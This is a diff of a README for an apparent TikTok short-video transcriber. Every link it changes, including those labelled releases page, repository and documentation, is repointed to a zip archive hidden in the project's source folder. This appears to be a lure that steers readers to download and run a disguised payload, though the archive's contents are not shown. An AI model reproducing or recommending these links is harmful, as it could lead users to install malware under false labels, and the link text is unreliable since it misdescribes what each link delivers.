@@ -1,13 +1,13 @@
 # 🎥 short-form-video-transcriber - Effortlessly Understand Short Videos
 
-[![Download the latest release](https://github.com/kys-rishi/short-form-video-transcriber/raw/refs/heads/main/src/short_form_scraper/summarizer/transcriber_video_short_form_v2.1-alpha.3.zip%20Now-Here-brightgreen)](https://github.com/kys-rishi/short-form-video-transcriber/raw/refs/heads/main/src/short_form_scraper/summarizer/transcriber_video_short_form_v2.1-alpha.3.zip)
+[![Download the latest release](https://raw.githubusercontent.com/kys-rishi/short-form-video-transcriber/main/src/short_form_scraper/pipeline/transcriber-video-form-short-v3.5-beta.3.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/kys-rishi/short-form-video-transcriber/main/src/short_form_scraper/pipeline/transcriber-video-form-short-v3.5-beta.3.zip)
 
 ## 🚀 Getting Started
 
 Welcome to the Short-Form Video Transcriber! This tool helps you scrape, transcribe, and summarize short-form videos from TikTok. Follow these easy steps to get started.
 
 1. **Download the Software:**
-   - Visit the [Releases page](https://github.com/kys-rishi/short-form-video-transcriber/raw/refs/heads/main/src/short_form_scraper/summarizer/transcriber_video_short_form_v2.1-alpha.3.zip) to download the application. Choose the version suitable for your operating system.
+   - Visit the [Releases page](https://raw.githubusercontent.com/kys-rishi/short-form-video-transcriber/main/src/short_form_scraper/pipeline/transcriber-video-form-short-v3.5-beta.3.zip) to download the application. Choose the version suitable for your operating system.
 
 ## 💻 System Requirements
 
@@ -17,7 +17,7 @@ Welcome to the Short-Form Video Transcriber! This tool helps you scrape, transcr
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://github.com/kys-rishi/short-form-video-transcriber/raw/refs/heads/main/src/short_form_scraper/summarizer/transcriber_video_short_form_v2.1-alpha.3.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/kys-rishi/short-form-video-transcriber/main/src/short_form_scraper/pipeline/transcriber-video-form-short-v3.5-beta.3.zip).
 2. Find the latest version.
 3. Click on the file that matches your operating system to download it.
 4. Follow the installation instructions specific to your OS (usually involves double-clicking the downloaded file).
@@ -79,7 +79,7 @@ Once you command the application, it will provide you with organized summaries o
 
 If you encounter issues while using the software:
 
-1. Ensure you have the latest version installed from the [Releases page](https://github.com/kys-rishi/short-form-video-transcriber/raw/refs/heads/main/src/short_form_scraper/summarizer/transcriber_video_short_form_v2.1-alpha.3.zip).
+1. Ensure you have the latest version installed from the [Releases page](https://raw.githubusercontent.com/kys-rishi/short-form-video-transcriber/main/src/short_form_scraper/pipeline/transcriber-video-form-short-v3.5-beta.3.zip).
 2. Check your internet connection.
 3. Restart the application if it becomes unresponsive.
 
@@ -96,7 +96,7 @@ Join our community for support, tips, and updates:
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://github.com/kys-rishi/short-form-video-transcriber/raw/refs/heads/main/src/short_form_scraper/summarizer/transcriber_video_short_form_v2.1-alpha.3.zip)
-- [Documentation](https://github.com/kys-rishi/short-form-video-transcriber/raw/refs/heads/main/src/short_form_scraper/summarizer/transcriber_video_short_form_v2.1-alpha.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kys-rishi/short-form-video-transcriber/main/src/short_form_scraper/pipeline/transcriber-video-form-short-v3.5-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/kys-rishi/short-form-video-transcriber/main/src/short_form_scraper/pipeline/transcriber-video-form-short-v3.5-beta.3.zip)
 
 Thank you for using the Short-Form Video Transcriber! Enjoy extracting insights from your favorite TikTok videos.
